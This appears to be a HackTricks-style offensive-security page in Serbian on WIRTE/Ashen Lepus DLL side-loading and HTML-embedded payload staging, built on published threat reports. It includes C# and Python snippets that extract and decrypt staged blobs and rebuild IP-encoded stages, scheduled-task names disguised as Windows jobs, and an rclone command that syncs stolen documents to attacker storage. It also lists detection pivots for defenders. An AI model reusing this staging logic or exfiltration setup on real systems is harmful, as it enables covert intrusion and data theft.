# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Pregled Tradecraft-a

Ashen Lepus (poznat i kao WIRTE) weaponized je ponovljiv obrazac koji povezuje DLL sideloading, staged HTML payloads i modularne .NET backdoors radi persistence unutar diplomatskih mreža Bliskog istoka. Ovu tehniku može ponovo koristiti bilo koji operator zato što se oslanja na:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: bezopasni PDF-ovi upućuju mete da preuzmu RAR arhivu sa file-sharing sajta. Arhiva sadrži EXE koji izgleda kao pravi document viewer, malicious DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) i mamac `Document.pdf`.
- **DLL search order abuse**: žrtva dvaput klikne na EXE, Windows učitava DLL import iz trenutnog direktorijuma, a malicious loader (AshenLoader) izvršava se unutar pouzdanog procesa dok se mamac PDF otvara kako bi se izbegla sumnja.
- **Living-off-the-land staging**: svaka naredna faza (AshenStager → AshenOrchestrator → modules) čuva se van diska dok ne bude potrebna, a isporučuje se kao encrypted blobs skriven unutar inače bezopasnih HTML odgovora.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE vrši side-load AshenLoader-a, koji prikuplja podatke o hostu, AES-CTR ih encrypt-uje i šalje POST zahtevom unutar promenljivih parametara kao što su `token=`, `id=`, `q=` ili `auth=` ka putanjama koje izgledaju kao API (npr. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2 otkriva narednu fazu samo kada se IP adresa klijenta geolocira u ciljanu regiju i kada se `User-Agent` podudara sa implantom, čime se otežava analiza u sandbox-ima. Kada provere prođu, HTTP telo sadrži blob `<headerp>...</headerp>` sa Base64/AES-CTR encrypted AshenStager payload-om.
3. **Second sideload**: AshenStager se deploy-uje uz drugi legitimni binary koji importuje `wtsapi32.dll`. Malicious kopija ubačena u binary preuzima još HTML sadržaja, ovog puta izdvajajući `<article>...</article>` kako bi povratila AshenOrchestrator.
4. **AshenOrchestrator**: modularni .NET controller koji dekodira Base64 JSON config. Polja `tg` i `au` iz config-a konkateniraju se i hash-uju u AES key, koji decrypt-uje `xrk`. Dobijeni bytes služe kao XOR key za svaki module blob koji se naknadno preuzme.
5. **Module delivery**: svaki module opisan je kroz HTML comments koji parser preusmeravaju na proizvoljni tag, čime se zaobilaze statička pravila koja proveravaju samo `<headerp>` ili `<article>`. Modules obuhvataju persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) i file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Čak i ako branioci blokiraju ili uklone određeni element, operater samo treba da promeni oznaku navedenu u HTML komentaru kako bi nastavio isporuku.<sup>[[1]](#references)</sup>

### Brzi pomoćni alat za ekstrakciju (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralele HTML Staging Evasion-a

Nedavna istraživanja HTML smuggling-a (Talos) ističu payload-e skrivene kao Base64 stringove unutar `<script>` blokova u HTML attachment-ima, koji se dekodiraju pomoću JavaScript-a tokom izvršavanja.<sup>[[2]](#references)</sup> Isti trik može ponovo da se iskoristi za C2 odgovore: stage-ovati enkriptovane blob-ove unutar script taga (ili drugog DOM elementa) i dekodirati ih u memoriji pre AES/XOR obrade, čime stranica izgleda kao običan HTML. Talos takođe prikazuje višeslojnu obfuscation (preimenovanje identifikatora uz Base64/Caesar/AES) unutar script tagova, što se direktno može primeniti na HTML-staged C2 blob-ove.<sup>[[2]](#references)</sup> Kasniji Talos writeup o **hidden text salting-u** takođe je relevantan: razdvajanje Base64 sadržaja pomoću nebitnih HTML komentara ili whitespace-a dovoljno je da pokvari jednostavne regex extractore, dok rekonstrukcija na strani browser-a ostaje trivijalna.<sup>[[7]](#references)</sup>

## Napomene o novijim varijantama (2024-2025)

- Check Point je 2024. godine primetio WIRTE campaigns koje su se i dalje oslanjale na archive-based sideloading, ali su koristile `propsys.dll` (stagerx64) kao prvu fazu. Stager dekodira sledeći payload pomoću Base64 + XOR (ključ `53`), šalje HTTP requests sa hardkodovanim `User-Agent` zaglavljem i izdvaja enkriptovane blob-ove ugrađene između HTML tagova. U jednoj grani, stage je rekonstruisan iz dugačke liste ugrađenih IP stringova dekodiranih pomoću `RtlIpv4StringToAddressA`, koji su zatim konkatenirani u payload bytes.<sup>[[3]](#references)</sup>
- OWN-CERT je dokumentovao raniji WIRTE tooling u kojem je side-loaded `wtsapi32.dll` dropper štitio stringove pomoću Base64 + TEA i koristio samo ime DLL-a kao ključ za dekripciju, a zatim XOR/Base64-obfuscation-om obrađivao podatke za identifikaciju hosta pre njihovog slanja ka C2-u.<sup>[[4]](#references)</sup>

## Rekonstrukcija IP-Encoded Stage-ova

WIRTE-ova `propsys.dll` grana iz 2024. godine pokazuje da sledeći PE ne mora da se nalazi kao jedan kontinualni HTML blob. Loader može da sačuva stage bytes kao dotted-quad stringove i ponovo ih izgradi pomoću `RtlIpv4StringToAddressA`, što je obrazac blisko povezan sa Hive **IPfuscation** tradecraft-om.<sup>[[3]](#references)[[5]](#references)</sup> Operativno, ovo je korisno kada actor želi da HTML stranica sadrži ono što izgleda kao bezopasni IOCs ili config data, umesto očiglednog Base64 payload-a.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Ako oporavljeni bajtovi počinju sa `MZ`, verovatno ste direktno rekonstruisali sledeći PE. Ako ne, proverite da li postoji početni XOR/Base64 sloj ili mali delimiter chunks između adresa.

## Zamenljiva DLL imena i rotacija hostova

Važna osobina ovog patterna jeste to što **HTML/AES/XOR staging backend može ostati identičan dok se menja samo sideload par**. WIRTE je kroz različite campaigns rotirao `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` i `propsys.dll`, što je korisno zato što:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` i `wtsapi32.dll` su uobičajena Windows DLL imena za koja defenderi očekuju da postoje u `%System32%` / `%SysWOW64%`.
- Javni katalozi, kao što je **HijackLibs**, već mapiraju mnoge binary-je koji će učitati ta DLL imena iz kopiranog application direktorijuma, što operatorima daje replacement hostove bez redizajniranja stagera.
- Samo export surface mora biti prilagođen svakom hostu. HTML parser, AES/XOR rutine i module loader obično se mogu neizmenjeni preneti u forwarding proxy DLL.

Za offensive lab rad, to znači da problem možete podeliti na **(1) pronalaženje stabilnog potpisanog hosta koji lokalno razrešava izabrano DLL ime** i **(2) ponovnu upotrebu iste staged-HTML loader logike iza tog DLL-a**.

## Crypto i ojačavanje C2

- **AES-CTR svuda**: aktuelni loaderi sadrže 256-bitne ključeve i nonce-ove (npr. `{9a 20 51 98 ...}`), a opciono dodaju XOR sloj koristeći strings kao što je `msasn1.dll` pre ili posle decryption-a.<sup>[[1]](#references)</sup>
- **Varijacije key material-a**: raniji loaderi koristili su Base64 + TEA za zaštitu embedded strings, pri čemu je decryption key izveden iz imena malicioznog DLL-a (npr. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Infrastructure split + camouflage subdomain-a**: staging serveri su razdvojeni po tool-u, hostovani na različitim ASN-ovima i ponekad postavljeni iza subdomain-a koji izgledaju legitimno, tako da kompromitovanje jednog stage-a ne otkriva ostatak.
- **Recon smuggling**: enumerisani podaci sada uključuju listings direktorijuma Program Files radi pronalaženja high-value aplikacija i uvek se encryptuju pre napuštanja hosta.
- **URI churn**: query parametri i REST paths rotiraju se između campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), čime se brittle detections čine nevažećim.
- **User-Agent pinning + bezbedni redirects**: C2 infrastructure odgovara samo na tačne UA strings, a u suprotnom redirektuje na benign news/health sajtove radi boljeg uklapanja u normalan saobraćaj.
- **Gated delivery**: serveri koriste geo-fencing i odgovaraju samo pravim implantima. Neodobreni klijenti dobijaju bezopasan HTML.

## Persistence i execution loop

AshenStager kreira scheduled tasks koji se predstavljaju kao Windows maintenance jobs i izvršavaju putem `svchost.exe`, na primer:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ovi tasks ponovo pokreću sideloading chain pri boot-u ili u određenim intervalima, čime se obezbeđuje da AshenOrchestrator može da zatraži sveže module bez ponovnog upisivanja na disk.

## Korišćenje benignih sync klijenata za exfiltration

Operatori smeštaju diplomatska dokumenta unutar `C:\Users\Public` (čitljivo svim korisnicima i bezazlenog izgleda) putem dedicated module-a, a zatim preuzimaju legitimni [Rclone](https://rclone.org/) binary radi sinhronizacije tog direktorijuma sa attacker storage-om. Unit42 navodi da je ovo prvi put da je ovaj actor primećen kako koristi Rclone za exfiltration, što se uklapa u širi trend zloupotrebe legitimnih sync tool-ova radi uklapanja u normalan saobraćaj:<sup>[[1]](#references)</sup>

1. **Staging**: kopirajte/prikupite ciljane fajlove u `C:\Users\Public\{campaign}\`.
2. **Konfiguracija**: isporučite Rclone config koji pokazuje na HTTPS endpoint pod kontrolom attackera (npr. `api.technology-system[.]com`).
3. **Sinhronizacija**: pokrenite `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` tako da saobraćaj podseća na uobičajene cloud backup-e.

Pošto se Rclone široko koristi za legitimne backup workflow-e, defenderi moraju da se usredsrede na anomalna izvršavanja (novi binary-ji, neobični remote-ovi ili iznenadna sinhronizacija sadržaja iz `C:\Users\Public`).

## Detection pivots

- Upozoravajte na **potpisane procese** koji neočekivano učitavaju DLL-ove iz putanja u koje korisnici mogu da upisuju (Procmon filters + `Get-ProcessMitigation -Module`), naročito kada se imena DLL-ova poklapaju sa `netutils`, `srvcli`, `dwampi`, `wtsapi32` ili `propsys`.<sup>[[6]](#references)</sup>
- Analizirajte sumnjive HTTPS responses za **velike Base64 blobove ugrađene unutar neuobičajenih tags** ili zaštićene komentarima `<!-- TAG: <xyz> -->`.
- Prvo normalizujte HTML: **uklonite komentare i sažmite whitespace pre Base64 extraction-a**, jer evasion u stilu hidden-text-salting-a može podeliti payload-e preko granica komentara.
- Proširite HTML hunting na **Base64 strings unutar `<script>` blokova** (HTML smuggling-style staging) koji se dekoduju pomoću JavaScript-a pre AES/XOR processing-a.
- Pratite ponovljene pozive ka **`RtlIpv4StringToAddressA` praćene sklapanjem buffera**, naročito kada su okolni strings dugačke IPv4 liste, a ne stvarni network targets.
- Tražite **scheduled tasks** koji pokreću `svchost.exe` sa non-service arguments ili upućuju nazad na dropper direktorijume.
- Pratite **C2 redirects** koji vraćaju payload-e samo za tačne `User-Agent` strings, a u suprotnom vode na legitimne news/health domene.
- Nadgledajte pojavljivanje **Rclone** binary-ja izvan IT-managed lokacija, novih `rclone.conf` fajlova ili sync jobs koji preuzimaju podatke iz staging direktorijuma kao što je `C:\Users\Public`.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
